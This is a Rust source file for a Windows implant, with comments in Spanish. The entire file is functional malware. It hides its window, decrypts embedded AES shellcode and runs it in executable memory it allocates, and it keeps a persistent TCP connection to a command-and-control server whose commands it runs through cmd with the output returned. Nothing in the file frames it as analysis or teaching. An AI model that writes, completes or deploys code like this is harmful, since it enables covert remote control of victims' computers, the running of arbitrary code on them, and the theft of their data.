#![windows_subsystem = "windows"]

mod config;

use aes::Aes256;
use cbc::{cipher::{block_padding::Pkcs7, BlockDecryptMut, KeyIvInit}, Decryptor};
use std::mem::transmute;
use std::ptr::copy;
use winapi::um::winnt::{PAGE_EXECUTE_READWRITE, MEM_COMMIT, MEM_RESERVE};
use winapi::um::memoryapi::VirtualAlloc;
use winapi::um::processthreadsapi::CreateThread;
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::winbase::INFINITE;
use winapi::shared::minwindef::DWORD;
use std::net::TcpStream;
use std::io::{Read, Write};
use std::process::Command;
use std::thread;
use std::time::Duration;

type Aes256CbcDec = Decryptor<Aes256>;

fn decrypt_shellcode() -> Vec<u8> {
    let cipher = Aes256CbcDec::new_from_slices(config::KEY, config::IV).unwrap();
    let mut buffer = config::ENCRYPTED_SHELLCODE.to_vec();
    cipher.decrypt_padded_mut::<Pkcs7>(&mut buffer).unwrap().to_vec()
}

fn execute_shellcode() {
    unsafe {
        let shellcode = decrypt_shellcode();

        let mem = VirtualAlloc(
            std::ptr::null_mut(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if mem.is_null() {
            return;
        }

        copy(shellcode.as_ptr(), mem.cast::<u8>(), shellcode.len());

        let func: extern "system" fn() -> DWORD = transmute(mem);
        let thread = CreateThread(
            std::ptr::null_mut(),
            0,
            Some(transmute(func as *const ())),
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut(),
        );

        if !thread.is_null() {
            WaitForSingleObject(thread, INFINITE);
        }
    }
}

fn execute_command(cmd: &str) -> String {
    let output = Command::new("cmd")
        .args(&["/C", cmd])
        .output();
    
    match output {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            
            if !stdout.is_empty() {
                stdout.to_string()
            } else if !stderr.is_empty() {
                stderr.to_string()
            } else {
                "Comando ejecutado sin salida".to_string()
            }
        }
        Err(e) => format!("Error ejecutando comando: {}", e)
    }
}

fn connect_to_c2() -> Result<(), Box<dyn std::error::Error>> {
    loop {
        // Intentar conectar al servidor C2
        match TcpStream::connect(&config::C2_SERVER) {
            Ok(mut stream) => {
                println!("Conectado al servidor C2");
                
                // Buffer para recibir comandos
                let mut buffer = [0; 1024];
                
                loop {
                    match stream.read(&mut buffer) {
                        Ok(0) => {
                            // Conexión cerrada por el servidor
                            println!("Servidor cerró la conexión");
                            break;
                        }
                        Ok(n) => {
                            let command = String::from_utf8_lossy(&buffer[..n]).trim().to_string();
                            
                            // Ejecutar el comando
                            let result = execute_command(&command);
                            
                            // Enviar el resultado de vuelta al servidor
                            if let Err(e) = stream.write_all(result.as_bytes()) {
                                println!("Error enviando respuesta: {}", e);
                                break;
                            }
                        }
                        Err(e) => {
                            println!("Error leyendo del servidor: {}", e);
                            break;
                        }
                    }
                }
            }
            Err(e) => {
                println!("Error conectando al servidor: {}", e);
                // Esperar antes de reintentar
                thread::sleep(Duration::from_secs(5));
            }
        }
        
        // Esperar antes de reconectar
        thread::sleep(Duration::from_secs(5));
    }
}

fn main() {
    // Ejecutar shellcode en un hilo separado (opcional)
    thread::spawn(|| {
        execute_shellcode();
    });
    
    // Conectar al servidor C2 (bucle principal)
    if let Err(e) = connect_to_c2() {
        println!("Error en conexión C2: {}", e);
    }
}
